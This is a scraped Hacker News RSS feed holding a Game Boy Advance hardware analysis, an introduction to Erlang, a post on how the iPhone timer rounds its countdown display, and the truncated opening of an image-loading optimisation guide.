<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>
<img name="image_cover" alt="Image" width="630" height="273" src="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png" loading="auto"></picture></a><figcaption>Memory architecture of the PPU</figcaption></div><p>We have the following regions of memory in which to distribute our graphics:</p><ul><li>96 KB 16-bit <strong>VRAM</strong> (Video RAM): Where 64 KB store background graphics and 32 KB store sprite graphics.</li><li>1 KB 32-bit <strong>OAM</strong> (Object Attribute Memory): Stores up to 128 sprite entries (not the graphics, just the indices and attributes). Its bus is optimised for fast rendering.</li><li>1 KB 16-bit <strong>PAL RAM</strong> (Palette RAM): Stores two palettes, one for backgrounds and the other for sprites. Each palette contains 256 entries of 15-bit colours each, colour ‘0’ being <em>transparent</em>.</li></ul><h4 id="constructing-the-frame">Constructing the frame</h4><p>If you’ve read the previous articles you’ll find the GBA familiar, although there is additional functionality that may surprise you, and don’t forget that this console runs on two AA batteries.</p><p>I’m going to borrow the graphics of Sega’s <em>Sonic Advance 3</em> to show how a frame is composed.</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-sprites-link"><a href="#tab-2-3-sprites">Sprites</a></li><li id="tab-2-4-result-link"><a href="#tab-2-4-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>4bpp Tiles found in VRAM<br>Last block is reserved for sprites</figcaption></div><p>GBA’s tiles are strictly 8x8 pixel bitmaps, they can use 16 colours (4bpp) or 256 colours (8bpp). 4bpp tiles consume 32 bytes, while 8bpp ones take 64 bytes.</p><p>Tiles are grouped into <strong>charblocks</strong>. Each block is reserved for a specific type of layer.</p><p>Because each charblock is designed to fit in 16 KB of memory, up to 256 8bpp tiles or 512 4bpp tiles can be stored per block. There are six charblocks allocated, which combined require 96 KB of memory: The exact amount of VRAM this console has.</p><p>Four charblocks are used for backgrounds and two are used for sprites.</p></div><div id="tab-2-2-backgrounds"><h4>Backgrounds</h4><div><figcaption>Affine background layers in use<br>Layer 3 will be scaled to simulate water effects</figcaption></div><p>The background layer of this system has improved significantly since the Game Boy Color. It finally includes some features found in the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> (remember the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">affine transformations</a>?).</p><p>The PPU can draw up to four background layers. The capabilities of each one will depend on the selected mode of operation:</p><ul><li><strong>Mode 0</strong>: Provides four static layers.</li><li><strong>Mode 1</strong>: Only three layers are available, although one of them is <strong>affine</strong> (can be rotated and/or scaled).</li><li><strong>Mode 2</strong>: Supplies two affine layers.</li></ul><p>Each layer be up to 512x512 pixels wide. If it’s an affine one then it will be up to 1024x1024 pixels.</p></div><div id="tab-2-3-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png" loading="auto"></picture></a><figcaption>Rendered Sprite layer</figcaption></div><p>The size of a sprite can be up to 64x64 pixels wide, yet for having such a small screen they will end up occupying a big part of it.</p><p>If that wasn’t enough, the PPU can now apply <strong>affine transformations</strong> to sprites!</p><p>Sprite entries are 32-bit wide and their values can be divided in two groups:</p><ul><li><strong>Attributes</strong>: Contains x/y position, h/v flipping, size, shape (square or rectangle), sprite type (affine or regular) and location of first tile.</li><li><strong>Affine data</strong>: Only used if the sprite is affine, specify scaling and rotation.</li></ul></div><div id="tab-2-4-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png" loading="auto"></picture></a><figcaption>All layers merged (<i>Tada!</i>)</figcaption></div><p>As always, the PPU will combine all layers automatically, but it’s not over yet! The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/game-boy-advance/">https://www.copetti.org/writings/consoles/game-boy-advance/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/game-boy-advance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564619</guid>
            <pubDate>Mon, 28 Dec 2020 23:32:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Erlang: The Programming Language That Quietly Powers WhatsApp and WeChat]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564176">thread link</a>) | @factandfiction
<br/>
December 28, 2020 | https://serokell.io/blog/introduction-to-erlang | <a href="https://web.archive.org/web/*/https://serokell.io/blog/introduction-to-erlang">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don’t have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company – Joe Armstrong, Robert Virding, and Mike Williams – decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I’ve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you’ve used Akka on JVM, you’ll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don’t discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won’t find tutorials for everything. It’s not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language’s functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today’s multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto – <a href="https://verraes.net/2014/12/erlang-let-it-crash/">“let it crash”</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I’ll try to bring insight into how an Erlang app is structured and how the “let it crash” philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let’s see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes – the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn’t solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn’t the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by José Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn’t actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir’s advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir’s advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you’ve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you’re into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves – an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You’re eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That’s reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You’re a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately. It will give you more job opportunities and will be easier to learn.</p><p>Afterward, you can learn Erlang and what makes it tick. Knowing how Erlang functions underneath Elixir will help you write better Elixir code and make you more likely to get hired as an Elixir developer.</p><p>Anyway, I don’t think you will regret any part of journeying BEAM, even though it is not all sunshine and rainbows (BEAM languages can get quite weird sometimes). If you are wondering where to start, I’d guide you either to <a href="https://learnyousomeerlang.com/">Learn You Some Erlang for Great Good!</a> or our beginner’s guide on <a href="https://serokell.io/blog/learn-elixir">learning Elixir</a>.</p><p>If you would like to read more posts on BEAM languages, don’t be afraid to also follow us on <a href="https://twitter.com/serokell">Twitter</a> or <a href="https://serokell.medium.com/">Medium</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/introduction-to-erlang</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564176</guid>
            <pubDate>Mon, 28 Dec 2020 22:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the iPhone Timer app displays a fake time]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 74 (<a href="https://news.ycombinator.com/item?id=25563708">thread link</a>) | @_antix
<br/>
December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://mp.weixin.qq.com/s/VDmjQacZNEmnynN6PylFhw" title="Chinese translation of this article">本文的中文翻译</a></p>
<p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-temp.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions-temp.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone-temp.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds-temp.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>
<h3 id="references"><a href="#references">¶</a> References:</h3>
<ul>
<li><a href="https://codepen.io/lhermann/pen/wvzPxXj">The code from the animations in this article</a></li>
</ul>
</div><div><p>I would love to hear from you if this article was helpful or if you have any questions</p><a href="https://twitter.com/_lhermann">Twitter</a></div></div>]]>
            </description>
            <link>https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563708</guid>
            <pubDate>Mon, 28 Dec 2020 21:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Maximally optimizing image loading for the web in 2021]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25563479">thread link</a>) | @cramforce
<br/>
December 28, 2020 | https://www.industrialempathy.com/posts/image-optimizations/ | <a href="https://web.archive.org/web/*/https://www.industrialempathy.com/posts/image-optimizations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this post I'll outline 8 image loading optimization techniques to minimize both the bandwidth used for loading images on the web and the CPU usage for image display. I'll present them in the form of an annotated HTML example to make it easy for folks to reproduce the results. Some of these techniques are more established, while others are somewhat novel. Ideally, your favorite mechanism for publishing web documents (like a CMS, static site generator, or web application framework) implements all of these out-of-the-box. I'll keep a <a href="#tools">list updated at the end of this posts</a> with technologies that provide <em>all</em> of the optimizations outlined here.</p><p>Together the techniques optimize all elements of <a href="https://web.dev/vitals/">Google's Core Web Vitals</a> by</p><ul><li>Minimizing the <a href="https://web.dev/lcp/">Largest Contentful Paint (LCP)</a> through reducing bytes, caching, and lazy loading.</li><li>Keeping <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a> to zero.</li><li>Reducing <a href="https://web.dev/fid/">First Input Delay(FID)</a> through reduced (main-thread) CPU usage.</li></ul><p>View the source of this sample image to see all the techniques in action:</p><p><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.avif 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.avif 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.avif 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.avif 320w" type="image/avif"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.webp 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.webp 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.webp 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.webp 320w" type="image/webp"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.jpg 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.jpg 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.jpg 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.jpg 320w" type="image/jpeg"><img alt="Sample image illustrating the techniques outlined in this post." height="2268" src="https://www.industrialempathy.com/img/remote/ZiClJf.jpg" width="4032" decoding="async" loading="lazy"></picture></p><h2 id="responsive-layout">Responsive layout <a href="#responsive-layout">#</a></h2><p>This is a well understood technique to make an image use the available horizontal space up until its maximum size while retaining the aspect ratio. New in 2020 is that web browsers will reserve the correct vertical space for the image before it loads if the <code>width</code> and <code>height</code> attributes are provided for the <code>img</code> element. This avoids <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a>.</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <span>img</span> <span>{</span><br>    <span>max-width</span><span>:</span> 100%<span>;</span><br>    <span>height</span><span>:</span> 